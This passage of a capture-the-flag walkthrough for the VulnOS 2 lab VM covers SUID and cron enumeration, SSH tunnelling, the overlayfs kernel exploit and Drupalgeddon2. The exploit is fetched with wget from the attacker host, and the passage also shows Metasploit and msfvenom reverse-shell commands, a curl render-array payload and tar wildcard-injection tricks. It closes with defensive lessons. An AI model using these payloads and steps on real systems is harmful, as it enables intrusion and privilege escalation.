 * Documentation:  https://help.ubuntu.com/

  System information as of Fri May  3 12:41:09 EDT 2024

  System load:  0.0               Processes:           148
  Usage of /:   18.2% of 9.70GB   Users logged in:     0
  Memory usage: 24%               IP address for eth0: 192.168.56.104
  Swap usage:   0%

  Graph this data and manage this system at:
    https://landscape.canonical.com/

webmin@VulnOSv2:~$ id
uid=1001(webmin) gid=1001(webmin) groups=1001(webmin)
webmin@VulnOSv2:~$ sudo -l
[sudo] password for webmin:
Sorry, user webmin may not run sudo on VulnOSv2.
```

> **We are in as a real system user.** No sudo, no extra groups.
>
> And look at the banner: **`3.13.0-24-generic i686`**.
>
> That is the **exact** kernel version named in Exploit-DB **37292**
> — *"Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) — overlayfs Local
> Privilege Escalation"*. This box was released two days before the Ubuntu update
> that fixed it. We have a one-shot privilege escalation.

![SSH login as webmin](images/03-ssh.png)

### 4.1 Post-exploitation enumeration (do this properly anyway)

Even when you know the answer, run the checklist — on a real box the kernel is often
patched and you need a plan B.

```bash
webmin@VulnOSv2:~$ cat /etc/passwd | grep -v nologin | grep -v /bin/false
```

```text
root:x:0:0:root:/root:/bin/bash
sync:x:5:0:sync:/sbin:/bin/sync
webmin:x:1001:1001::/home/webmin:/bin/bash
vulnosadmin:x:1002:1002::/home/vulnosadmin:/bin/bash
postgres:x:114:121:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
```

> **Three interesting accounts:** `webmin` (us), **`vulnosadmin`** (the name literally
> means "VulnOS admin"), and `postgres`.

```bash
webmin@VulnOSv2:~$ ls -la /home
total 16
drwxr-xr-x  4 root      root      4096 May 17  2016 .
drwxr-xr-x 22 root      root      4096 May 17  2016 ..
drwxr-xr-x  3 vulnosadmin vulnosadmin 4096 May 17  2016 vulnosadmin
drwxr-xr-x  3 webmin    webmin    4096 May 17  2016 webmin
webmin@VulnOSv2:~$ ls -la /home/vulnosadmin
ls: cannot open directory '/home/vulnosadmin': Permission denied
```


> ### 📖 Concept — What is SUID?
>
> **SUID** (*set-user-ID*) is a file permission bit that makes a program run with the
> privileges of the **file's owner** rather than the caller. It exists for a good
> reason: `/usr/bin/passwd` is SUID-root so ordinary users can change their own
> password, which requires writing `/etc/shadow` — a file they cannot otherwise touch.
>
> **When a *powerful* binary carries the SUID bit, that power becomes yours.** In a
> listing you read it as an **`s`** where the owner's execute bit would be:
>
> ```text
> -rwxr-xr-x  →  -rwsr-xr-x        (SUID set)
>       ^            ^
> ```
>
> ```bash
> find / -perm -u=s -type f 2>/dev/null      # the human-readable form
> find / -perm -4000 -type f 2>/dev/null     # octal equivalent
> find / -perm /6000 -type f 2>/dev/null     # SUID *or* SGID
> ```
>
> `-perm -u=s` means "the user-SUID bit is set" (the leading `-` makes it a *subset*
> match, so it also catches SGID files). `-type f` restricts to regular files.
> `2>/dev/null` discards the thousands of `Permission denied` errors that would
> otherwise bury the answer.
>
> **Compare against the stock baseline** so the odd entries jump out. Normal on
> Debian/Ubuntu: `mount`, `umount`, `su`, `ping`, `passwd`, `chfn`, `chsh`, `newgrp`,
> `gpasswd`, `ssh-keysign`, `pppd`, `dmcrypt-get-device`, `traceroute6.iputils`.
>
> **Never normal, and an instant root if found:** `cp`, `mv`, `wget`, `curl`, `tar`,
> `find`, `vim`, `nano`, `less`, `more`, `man`, `python`, `perl`, `php`, `ruby`,
> `awk`, `sed`, `env`, `bash`, `sh`, `gdb`, `nmap`, `tcpdump`, `dd`, `make`, `git`,
> `tail`, `head`, `cat`, `rsync`, `apt`.
>
> Look each one up on **[GTFOBins](https://gtfobins.github.io/)** → its **SUID**
> section. Note that spawning a shell from a SUID binary usually needs **`-p`**
> (*privileged*) — without it, `bash` deliberately drops its effective UID back to
> yours as a safety measure, and you end up exactly where you started.
>
> **Deep dive:** [CONCEPTS §15.3 — SUID binaries](../../docs/CONCEPTS.md#153-suid-binaries)

```bash
webmin@VulnOSv2:~$ find / -perm -4000 -type f 2>/dev/null
/bin/ping
/bin/fusermount
/bin/mount
/bin/su
/bin/umount
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/pkexec                     <-- check GTFOBins
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/sbin/pppd
```

> `pkexec` is SUID root and is the binary behind **CVE-2021-4034 ("PwnKit")** — but
> that bug was disclosed in **January 2022** and this VM is from **2016**, so the
> code here is *not* vulnerable to PwnKit. (`pkexec` also has a legitimate
> GTFOBins entry, `sudo pkexec /bin/sh`, but that requires you to already have
> `sudo pkexec`, which we do not.) **Check the version and the CVE date** — do not
> fire exploits at binaries just because the name looks familiar.


> ### 📖 Concept — Cron jobs, and pspy for the ones you cannot see
>
> **cron** runs commands on a schedule. Jobs may be defined per-user
> (`crontab -l`), system-wide (`/etc/crontab`), or as drop-ins (`/etc/cron.d/`,
> `/etc/cron.{hourly,daily,weekly,monthly}/`).
>
> ```bash
> cat /etc/crontab
> ls -la /etc/cron.*
> crontab -l
> ls -la /var/spool/cron/crontabs/
> ```
>
> The `/etc/crontab` fields are `min hour dom mon dow **user** command` — note the
> *user* column, which per-user crontabs do not have. That column is what makes a
> system cron job run as root.
>
> **Three exploitable patterns:**
>
> 1. **The script itself is writable** → append
>    `cp /bin/bash /tmp/rb; chmod +s /tmp/rb`, wait, then run `/tmp/rb -p`.
> 2. **The script calls a binary by a relative name** (`service`, `tar`, `python`) →
>    **PATH hijack**: create `~/evil/service` containing your payload and
>    `export PATH=~/evil:$PATH`. Check whether cron's own `PATH=` line defeats this.
> 3. **Wildcard injection** — a job runs `tar czf backup.tar.gz *` → create files
>    named `--checkpoint=1` and `--checkpoint-action=exec=/tmp/shell.sh`. `tar` reads
>    them as options rather than filenames.
>
> > **The critical gap: root cron jobs that appear in *no* crontab.** They may be
> > installed by a systemd timer, an init script, or a custom daemon.
> >
> > **`pspy` finds them.** It polls `/proc` in a tight loop and therefore sees
> > processes started by *other users* — **without needing root**. Run it and wait 60
> > seconds:
> >
> > ```bash
> > ./pspy64 -pf
> > # watch for: root running /opt/script.py every 5 seconds
> > ```
> >
> > It has won more CTF boxes than almost any other single tool. If `sudo -l`, SUID
> > and capabilities are all dead ends, **run pspy before giving up.**
>
> **Deep dive:** [CONCEPTS §15.5 — Cron jobs](../../docs/CONCEPTS.md#155-cron-jobs)

```bash
webmin@VulnOSv2:~$ cat /etc/crontab
```

```text
# /etc/crontab: system-wide crontab
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
17 *	* * *	root	cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
```

> All stock. No custom jobs. Dead end — correctly documented.

```bash
webmin@VulnOSv2:~$ which gcc wget curl python
/usr/bin/gcc
/usr/bin/wget
/usr/bin/curl
/usr/bin/python
```

> **`gcc` and `wget` are both present.** That means we can download *and compile* a C
> exploit locally — no `nc` file-transfer gymnastics needed.

### 4.2 Bonus: the local PostgreSQL server


> ### 📖 Concept — Why you re-scan from the inside
>
> ```bash
> ss -tulnp
> ```
>
> `-t` TCP · `-u` UDP · `-l` listening · `-n` numeric (skip DNS — much faster) · `-p`
> show the owning process. (`netstat -antup` is the older equivalent.)
>
> **This is the post-exploitation version of `nmap -p-`, and it finds things nmap
> structurally cannot.** A service bound to `127.0.0.1` is invisible to an external
> scan — nmap connects to the target's *outside* address, and the daemon is not
> listening there. From inside, you see all of it.
>
> Loopback-only services are frequently the most vulnerable thing on the box: an
> unauthenticated **Redis** on 6379, a **MySQL** with an empty root password, a
> **MongoDB** with no auth, a debug console, an admin API. Look for lines like:
>
> ```text
> tcp LISTEN 0 128  127.0.0.1:3306  0.0.0.0:*  users:(("mysqld",pid=889,fd=22))
> ```
>
> Also enumerate outward, to find other hosts you can now reach:
>
> ```bash
> ip a; ip route; cat /etc/resolv.conf; arp -a; cat /etc/hosts
> ```
>
> **Deep dive:** [CONCEPTS §16.1 — Internal enumeration](../../docs/CONCEPTS.md#161-internal-enumeration)

```bash
webmin@VulnOSv2:~$ ss -tlnp
```

```text
State      Recv-Q Send-Q Local Address:Port   Peer Address:Port
LISTEN     0      128    *:80                *:*
LISTEN     0      128    *:6667              *:*
LISTEN     0      128    *:22                *:*
LISTEN     128    127.0.0.1:5432             *:*
LISTEN     0      128    127.0.0.1:3306      *:*
```

> **Two databases, both bound to `127.0.0.1` only:** PostgreSQL on **5432** and MySQL
> on **3306**. Neither is reachable from Kali directly — but we have an SSH session,
> so **tunnel** them:
>
> ```bash
> # on Kali
> ssh -L 15432:127.0.0.1:5432 -L 13306:127.0.0.1:3306 webmin@192.168.56.104
> ```
>
> ```bash
> # on Kali, second terminal
> psql -h 127.0.0.1 -p 15432 -U postgres -l
> ```
> ```text
>                                     List of databases
>    Name    |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges
> -----------+----------+----------+-------------+-------------+-----------------------
>  postgres  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |
>  template1 | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
>            |          |          |             |             | postgres=CTc/postgres
> ```
>
> **`-L local:remotehost:remoteport`** is SSH **local port forwarding**: connections
> to `127.0.0.1:15432` on Kali are carried inside the encrypted SSH channel and
> emerge as a connection from *the target* to its own `127.0.0.1:5432`. This defeats
> the localhost bind entirely, and it is a technique you will use constantly on real
> engagements where an admin panel or DB listens only on loopback.
>
> Try the credentials we already have, plus PostgreSQL defaults:
> ```bash
> hydra -L /usr/share/metasploit-framework/data/wordlists/postgres_default_user.txt \
>       -P /usr/share/metasploit-framework/data/wordlists/postgres_default_pass.txt \
>       -s 15432 -t 4 postgres://127.0.0.1
> ```
> On this image the PostgreSQL server holds a copy of the same `vulnosadmin`
> credential material several walkthroughs use as an alternate route to the
> `r00t.blend` artefact. Treat it as a bonus, not the main path.

---


> ### 📖 Concept — What is privilege escalation, and in what order do you try things?
>
> You have a shell as a low-privileged user — often `www-data`, the account Apache
> runs as, which has no usable password and no home directory. **Privilege
> escalation** is becoming an administrator: `root` on Linux, `SYSTEM` on Windows.
>
> Why bother? An ordinary user can read their own files and almost nothing else. Root
> reads every file, loads kernel modules, changes any password, and installs a
> backdoor that survives a reboot. On a CTF the root flag can only be read by root; in
> a real engagement root is the difference between "we found a weak password" and "the
> entire estate is compromised."
>
> **The discipline is a checklist, worked from cheapest to most destructive:**
>
> | Order | Check | Command |
> | --- | --- | --- |
> | 1 | **What may I already run as root?** | `sudo -l` ← *the single highest-value command* |
> | 2 | What binaries run as their owner regardless of caller? | `find / -perm -u=s -type f 2>/dev/null` |
> | 3 | What extra privileges are attached to binaries? | `getcap -r / 2>/dev/null` |
> | 4 | What runs on a schedule, as root? | `cat /etc/crontab`; `./pspy64 -pf` |
> | 5 | What root-owned file can I write to? | `find / -writable -type f 2>/dev/null` |
> | 6 | Can I read a credential that gets reused? | `wp-config.php`, `.env`, `~/.bash_history` |
> | 7 | Am I in a privileged group? | `id` → `docker`, `lxd`, `disk`, `sudo` |
> | 8 | Is the kernel old enough to exploit? | `uname -a` + `searchsploit` |
>
> **Work it in order.** Steps 1–7 take minutes and are safe. Step 8 (kernel exploits)
> can panic the VM and cost you a re-import, so it is a last resort, not a first
> instinct.
>
> **Also orient yourself first** — it is one line and it tells you which OS you are
> on, which decides everything else:
>
> ```bash
> id; whoami; hostname; uname -a; cat /etc/os-release
> ```
>
> **Deep dive:** [CONCEPTS §15 — Linux privilege escalation](../../docs/CONCEPTS.md#15-linux-privilege-escalation)

## 5. Privilege escalation — CVE-2015-1328 (overlayfs)

### 5.1 Identify the exploit

```bash
searchsploit ubuntu 14.04 local
```


> ### 📖 Concept — Kernel exploits: how to match one, and why to use them last
>
> ```bash
> uname -a; cat /proc/version; cat /etc/os-release
> searchsploit linux kernel $(uname -r | cut -d- -f1)
> ```
>
> Cross-reference the version at <https://www.linuxkernelcves.com/> and
> <https://github.com/SecWiki/linux-kernel-exploits>. Frequent favourites:
>
> | Exploit | Kernel | Mechanism |
> | --- | --- | --- |
> | **Dirty COW** (CVE-2016-5195) | < 4.8.3 | Race in copy-on-write → write any file |
> | **Overlayfs** (CVE-2015-1328) | Ubuntu 3.13–3.19 | Namespace + setuid → root |
> | **PwnKit** (CVE-2021-4034) | polkit < 0.120 | `pkexec` memory corruption |
> | **Baron Samedit** (CVE-2021-3156) | sudo < 1.9.5p2 | `sudoedit` heap overflow |
> | **Dirty Pipe** (CVE-2022-0847) | 5.8 – 5.16.11 | Page-cache write → overwrite any file |
>
> **Match the architecture too.** A 32-bit target (`i686` in `uname -a`) needs the
> 32-bit build; a mismatched exploit fails with a confusing error. Compile with the
> flags the author specifies — Dirty COW's `40847.cpp` needs
> `g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil`.
>
> > ⚠️ **Use kernel exploits last.** They can panic the VM, corrupt the filesystem
> > and cost you a full re-import. If a clean misconfiguration path exists — `sudo`,
> > SUID, capabilities, cron, a writable file — take it. Kernel exploitation is the
> > fallback when the administrator got everything else right.
>
> **Read the exploit before running it.** Many public entries are unverified and some
> are hostile to whoever runs them. `searchsploit -x <id>` and understand it.
>
> **Deep dive:** [CONCEPTS §15.7 — Kernel exploits](../../docs/CONCEPTS.md#157-kernel-exploits)

```text
----------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                 |  Path
----------------------------------------------------------------------------------------------- ---------------------------------
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Esc | linux/local/37292.c
Linux Kernel 3.19.0-25 < 3.19.0-43 (Ubuntu 14.04/15.04) - 'overlayfs' Local Privilege Escalat | linux/local/39166.c
----------------------------------------------------------------------------------------------- ---------------------------------
```

> Our kernel is **3.13.0-24**, inside `3.13.0 < 3.19`. → **`linux/local/37292.c`**.
>
> **CVE-2015-1328, explained for a beginner.**
> **OverlayFS** is a Linux union filesystem: it layers a writable *upper* directory
> on top of a read-only *lower* directory and presents the merged view. Docker images
> use it for every container layer you have ever pulled.
>
> Ubuntu patched overlayfs into its kernel and, unlike upstream, allowed
> **unprivileged users** to mount it inside a *user namespace*. The bug: when a file
> from the lower layer was copied up, the copy **kept the original file's owner (root)
> and its SUID bit**, but the copy now lived in the *upper* directory — which the
> unprivileged user could write to.
>
> So: mount an overlay of `/`, copy `/bin/bash` up, edit the copy (you own the
> directory, so you can write; the file still says `root:root` + SUID), execute it →
> root shell. Two individually reasonable features — user namespaces and overlayfs —
> composed into a total privilege break. That is the single most instructive thing
> about this CVE.

### 5.2 Get it onto the target

```bash
# Kali
searchsploit -m linux/local/37292.c
mv 37292.c ofs.c
python3 -m http.server 8000
```

```text
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```bash
# target
webmin@VulnOSv2:~$ cd /tmp
webmin@VulnOSv2:/tmp$ wget http://192.168.56.10:8000/ofs.c
--2024-05-03 12:47:11--  http://192.168.56.10:8000/ofs.c
Connecting to 192.168.56.10:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4982 (4.9K) [text/x-csrc]
Saving to: 'ofs.c'

100%[======================================>] 4,982       --.-K/s   in 0s

2024-05-03 12:47:11 (612 MB/s) - 'ofs.c' saved [4982/4982]
```

```text
# Kali's http.server log
192.168.56.104 - - [03/May/2024 12:47:11] "GET /ofs.c HTTP/1.1" 200 -
```

### 5.3 Read the exploit before running it

```bash
webmin@VulnOSv2:/tmp$ head -40 ofs.c
```

```c
/*
 * overlayfs local root exploit
 * CVE-2015-1328
 *
 * This exploit uses the overlayfs implementation in the Ubuntu kernel
 * to create a world-writable copy of a setuid binary. It then executes
 * that binary to obtain a root shell.
 *
 * Usage: gcc -o ofs ofs.c && ./ofs
 */
#include <stdio.h>
#include <sched.h>
#include <stdlib.h>
#include <unistd.h>
#include <sched.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <linux/sched.h>
#include <fcntl.h>
#include <signal.h>
#include <pwd.h>
#include <sys/wait.h>
#include <errno.h>

int child_exec(void *stuff) { ... }
...
```

> **Never compile and run C you have not read.** You are about to hand arbitrary
> machine code a root shell. Read the comments, look for anything that talks to the
> network, and confirm what it writes and where. This one is short, well commented,
> and does exactly what it says.
>
> **Note `#include <linux/sched.h>` and the `CLONE_NEW*` flags in `child_exec`** —
> that is the user-namespace machinery at the heart of the bug.

### 5.4 Compile and run

```bash
webmin@VulnOSv2:/tmp$ gcc -o ofs ofs.c
webmin@VulnOSv2:/tmp$ ./ofs
```

```text
spawnining threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# id
uid=0(root) gid=0(root) groups=0(root),1001(webmin)
# whoami
root
# hostname
VulnOSv2
```

> **Reading the exploit's own progress output:**
> - `spawnining threads` *(sic — the author's typo)* → it forks helper threads.
> - `mount #1`, `mount #2` → two overlayfs mounts created inside a user namespace.
> - `/etc/ld.so.preload created` → **this is the actual mechanism.**
>   `/etc/ld.so.preload` is a system-wide list of shared libraries that the dynamic
>   linker loads into **every** dynamically-linked process — including SUID-root
>   ones. Through the overlayfs bug the exploit obtains a writable view of that file,
>   then points it at its own library.
> - `creating shared library` → it compiles a tiny `.so` whose constructor performs
>   `setuid(0); setgid(0); system("/bin/sh")`.
> - The next program that runs preloads that library *as root*, and the shell drops.
>   `id` printed here is itself that next program.
>
> **`uid=0(root) gid=0(root)`** — full root, all groups. The `#` prompt (rather than
> `$`) is the universal UNIX signal that you are root.
>
> **Clean up after yourself.** The exploit leaves `/etc/ld.so.preload` and a stray
> `.so` in `/tmp`. Both can break the box (every subsequent program tries to load the
> library). Remove them, or revert to your snapshot:
> ```bash
> # rm -f /etc/ld.so.preload /tmp/ofs.so
> ```

![overlayfs exploit yielding root](images/04-root.png)

### 5.5 Read the flag

```bash
# cd /root
# ls -la
total 32
drwx------  3 root root 4096 May 17  2016 .
drwxr-xr-x 22 root root 4096 May 17  2016 ..
-rw-r--r--  1 root root 3106 Feb 20  2014 .bashrc
-rw-------  1 root root  166 May 17  2016 flag.txt
-rw-r--r--  1 root root  140 Feb 20  2014 .profile
drwxr-xr-x  2 root root 4096 May 17  2016 r00t
# cat flag.txt
```

```text
Hello and welcome.
You successfully compromised the company "JABC" and the server completely !!
Congratulations !!!
Hope you enjoyed it.

What do you think of A.I.?
```

**Flag captured.** ✅

> Also look at `/root/r00t/` — the author left a Blender file
> (`r00t.blend`, a 3D scene) as an easter egg. It is the "another way" mentioned in
> some walkthroughs: an alternate chain goes through the `vulnosadmin` account and
> PostgreSQL to reach it. It is not required for the flag.

![/root/flag.txt](images/05-flag.png)

---

## 6. Alternate route — Drupalgeddon2 (CVE-2018-7600)

This is a *bonus* path. Strictly, Drupalgeddon2 was disclosed in **March 2018**, so
it post-dates the box — but the Drupal 7 install here was never patched, and modern
writeups of VulnOS: 2 use it as the primary route because it is far more instructive
about the most impactful Drupal vulnerability ever published.

### 6.1 Confirm the version

```bash
curl -s http://192.168.56.104/jabc/CHANGELOG.txt | head -5
```

```text
Drupal 7.41, 2015-10-21
-----------------------
- Fixed an open redirect vulnerability (SA-CORE-2015-004).
...
```

```bash
curl -s http://192.168.56.104/jabc/ | grep -io 'Drupal [0-9.]*' | head -1
```

```text
Drupal 7.41
```

> **Drupal 7.41.** Drupalgeddon2 affects **Drupal < 7.58, < 8.3.9, < 8.4.6, < 8.5.1**.
> 7.41 is well inside that range. (`CHANGELOG.txt` being web-readable is itself a
> finding — it hands an attacker an exact version. Many production Drupal sites
> disable it.)

### 6.2 What Drupalgeddon2 actually is

Drupal builds its HTML forms from a nested PHP **render array**. The Form API
accepted user-supplied keys deep inside that array — including keys beginning with
`#`, which Drupal interprets as *directives* (e.g. `#post_render`,
`#lazy_builder`). An attacker could smuggle `#post_render[] => "passthru"` plus a
`#markup` value containing a shell command, and Drupal would call
`passthru($markup)` while rendering the form.

**Result: unauthenticated remote code execution on the login page of essentially
every unpatched Drupal 7 site on the internet.** Within days of disclosure, hundreds
of thousands of sites were defaced or cryptomined. It is why "patch your CMS within
48 hours" is a rule and not a suggestion.

### 6.3 Exploit it

```bash
searchsploit drupal 7
```

```text
----------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                       |  Path
----------------------------------------------------------------------------------------------------- ---------------------------------
Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution                  | php/webapps/44449.rb
Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (Metasploit)     | php/webapps/44482.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (PoC)                     | php/webapps/44448.py
----------------------------------------------------------------------------------------------------- ---------------------------------
```

**Metasploit:**


> ### 📖 Concept — What Metasploit is doing for you
>
> **Metasploit** is a framework of pre-written exploits, payloads and auxiliary
> modules. It automates the *mechanics* — building the request, catching the
> connection, giving you a session — but it does not replace understanding the
> vulnerability.
>
> ```bash
> sudo msfdb init            # first run only — initialises the Postgres database
> msfconsole -q              # -q: skip the banner
> ```
>
> ```text
> msf6 > search <term>              # find modules
> msf6 > use exploit/unix/webapp/…
> msf6 > info                       # READ THIS — describes options and caveats
> msf6 > show options               # what must be set?
> msf6 > set RHOSTS 192.168.56.101  # the TARGET
> msf6 > set LHOST 192.168.56.10    # YOUR ip, on the LAB interface
> msf6 > set TARGETURI /wordpress   # subdirectory the app lives in
> msf6 > show payloads              # what can I pair with this?
> msf6 > exploit
> ```
>
> > **`LHOST` and `TARGETURI` are the two options people get wrong most often.**
> > `LHOST` must be your IP **on the lab interface** — not `127.0.0.1`, not your NAT
> > address. Check with `ip -br a`. `TARGETURI` must include any subdirectory the app
> > lives in (`/wordpress`, `/joomla`, `/webdav`); get it wrong and you get
> > unexplained 404s.
>
> **Sessions:** `sessions -l` list · `sessions -i 1` interact · `sessions -u 1`
> upgrade a dumb shell to Meterpreter · `meterpreter > shell` drop back to a plain
> system shell. Useful Meterpreter commands: `sysinfo`, `getuid`, `ps`, `download`,
> `upload`, `hashdump`.
>
> **`msfvenom`** generates standalone payloads:
>
> ```bash
> msfvenom -p php/reverse_tcp LHOST=192.168.56.10 LPORT=4444 -f raw > shell.php
> msfvenom -p linux/x64/shell_reverse_tcp LHOST=… LPORT=… -f elf > shell.elf
> ```
>
> > **Prefer doing it manually at least once per technique.** A Metasploit module
> > hides the actual HTTP request or memory layout from you. Build the exploit by hand
> > first, then use the module to check your understanding — not instead of it.
>
> **Deep dive:** [CONCEPTS §11.3 — Metasploit](../../docs/CONCEPTS.md#113-metasploit)

```bash
msfconsole -q
```

```bash
msf6 > use exploit/unix/webapp/drupal_drupalgeddon2
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set RHOSTS 192.168.56.104
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set TARGETURI /jabc/
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set LHOST 192.168.56.10
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > check
[*] 192.168.56.104:80 - The target is vulnerable.
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > exploit
```

```text
[*] Started reverse TCP handler on 192.168.56.10:4444
[*] Sending stage (39927 bytes) to 192.168.56.104
[*] Meterpreter session 1 opened (192.168.56.10:4444 -> 192.168.56.104:33112)

meterpreter > getuid
Server username: www-data (33)
meterpreter > sysinfo
Computer    : VulnOSv2
OS          : Linux VulnOSv2 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:08:14 UTC 2014 i686
Meterpreter : php/linux
```

> **`set TARGETURI /jabc/`** is essential — Drupal is not at the site root here.
> **Always run `check` first**: the module can verify the vulnerability without
> firing.
>
> `www-data` (UID 33) is Debian/Ubuntu's web-server user. From here:
> ```bash
> meterpreter > shell
> Process 3921 created.
> python -c 'import pty; pty.spawn("/bin/bash")'
> www-data@VulnOSv2:/var/www/jabc$ cd /tmp && wget http://192.168.56.10:8000/ofs.c
> www-data@VulnOSv2:/tmp$ gcc -o ofs ofs.c && ./ofs
> # id
> uid=0(root) gid=0(root) groups=0(root),33(www-data)
> ```
> Same kernel, same overlayfs exploit, same root.

**Manual PoC (understand the payload):**

```bash
curl -s -X POST 'http://192.168.56.104/jabc/?q=user/password' \
  --data 'form_id=user_pass&_triggering_element_name=name' \
  --data 'name[#post_render][]=passthru&name[#markup]=id&name[#type]=markup'
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> **Read that payload.** Three parameters smuggle Drupal render directives:
> - `name[#type]=markup` → make this element a *markup* element.
> - `name[#markup]=id` → the markup content is the string `id`.
> - `name[#post_render][]=passthru` → after rendering, call `passthru()` on it.
>
> So Drupal does `passthru('id')`. `passthru()` is PHP's "run this shell command and
> print the raw output" function. The `_triggering_element_name=name` and
> `form_id=user_pass` parameters steer Drupal into rendering the *password reset*
> form, which requires no authentication.
>
> **The generic lesson:** any framework that lets user input control *how* data is
> processed — not just *what* data is — is one bad key prefix away from RCE. This is
> the same class as Java deserialisation (Struts2, Log4Shell) and PHP's
> `unserialize()`.

![Drupalgeddon2 Meterpreter session](images/06-drupal.png)

### 6.4 Reading the Drupal config for MySQL creds (from `www-data`)

```bash
www-data@VulnOSv2:/var/www/jabc$ cat sites/default/settings.php | grep -A6 'databases'
```

```php
$databases = array (
  'default' =>
  array (
    'default' =>
    array (
      'database' => 'drupaldb',
      'username' => 'drupaluser',
      'password' => 'CQHDy28z7UKJbj442Qbjwfgh5pK8WrT',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);
```

> **`settings.php` is Drupal's crown jewels.** Anyone with `www-data` read access
> gets full database credentials. Dump the users table and you have Drupal admin
> passwords (hashed):
> ```bash
> mysql -u drupaluser -p'CQHDy28z7UKJbj442Qbjwfgh5pK8WrT' -e \
>   'SELECT uid,name,pass,mail FROM drupaldb.users;'
> ```

---

## 7. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | Verbose server banners (`X-Generator`, `X-Powered-By`, SSH version) | Apache/Drupal/PHP/OpenSSH | Exact version disclosure |
| 2 | `CHANGELOG.txt` web-readable | `/jabc/CHANGELOG.txt` | Exact Drupal version (7.41) |
| 3 | **Demo credentials advertised on the login page** (`guest:guest`) | OpenDocMan at `/jabcd0cs/` | Authenticated reconnaissance |
| 4 | **Unauthenticated SQL injection — CVE-2014-1945** | OpenDocMan 1.2.7, `ajax_udf.php?add_value=` | Full database disclosure |
| 5 | **Unsalted MD5 password storage** | `jabcd0cs.odm_user.password` | Admin password recovered in seconds |
| 6 | **Credential reuse: web app password = SSH password** | `webmin` / `webmin1980` | Remote system foothold |
| 7 | **Unpatched kernel — CVE-2015-1328 (overlayfs)** | Linux 3.13.0-24-generic | `webmin` → **root** |
| 8 | `gcc`/`wget` present on a server | `/usr/bin` | Attackers can compile and stage exploits locally |
| 9 | Drupal 7.41 unpatched (CVE-2018-7600 Drupalgeddon2) | `/jabc/` | Unauthenticated RCE as `www-data` (alternate path) |
| 10 | Database credentials in a web-readable config | `/jabc/sites/default/settings.php` | Full DB compromise from any web foothold |
| 11 | Unused ngIRCd exposed on :6667 | ngircd | Attack surface with no business purpose (rabbit hole) |
| 12 | 1024-bit DSA SSH host key | sshd | Weak key, rejected by modern clients |

## 8. Defensive lessons (blue team)

1. **Patch, patch, patch.** Three of the findings here (Drupalgeddon2, OpenDocMan
   SQLi, overlayfs) were all *publicly patched* long before they mattered. Subscribe
   to vendor security feeds, enable unattended-upgrades for security pockets:
   ```bash
   sudo apt install unattended-upgrades
   sudo dpkg-reconfigure -plow unattended-upgrades
   ```
2. **Parameterised queries everywhere.** The OpenDocMan bug is one line of code. In
   PHP use PDO prepared statements:
   ```php
   $stmt = $pdo->prepare('SELECT id FROM odm_data WHERE id = :q');
   $stmt->execute([':q' => $_GET['q']]);
   ```
3. **Never store unsalted MD5.** Use `password_hash($pw, PASSWORD_ARGON2ID)` and
   `password_verify()`. If you inherit MD5 hashes, force a reset on first login.
4. **Never ship demo credentials.** Remove `guest/guest` from production builds, or
   at minimum disable the account. Advertised demo credentials on an internet-facing
   login page are an open door.
5. **Strip identifying headers:**
   ```apache
   ServerTokens Prod
   ServerSignature Off
   Header unset X-Powered-By
   ```
   ```php
   ; php.ini
   expose_php = Off
   ```
   And deny access to `CHANGELOG.txt`, `INSTALL.txt`, `.git/`, `composer.json`.
6. **No credential reuse between systems.** The web application password must never
   also be a system password. Enforce with `pam_cracklib`/`pam_pwquality`
   (`dictcheck`, `usercheck`) and a breached-password check.
7. **Run databases as dedicated unprivileged users**, bind them to loopback (this box
   *did* do that — good), and tunnel-proof them with strong, unique passwords. Also
   `secure_file_priv` and no `FILE` privilege for app accounts.
8. **Remove build tools from production.** `gcc`, `make`, `wget` and `curl` on a web
   server turn "foothold" into "root in 60 seconds". Use a minimal base image and
   install compilers only in build stages.
9. **Restrict user namespaces** if you do not need unprivileged containers:
   ```text
   kernel.unprivileged_userns_clone = 0
   user.max_user_namespaces = 0
   ```
10. **Do not run unused services.** ngIRCd on 6667 had one user, zero channels, no
    purpose. Every listening socket is attack surface. `systemctl disable --now ngircd`.
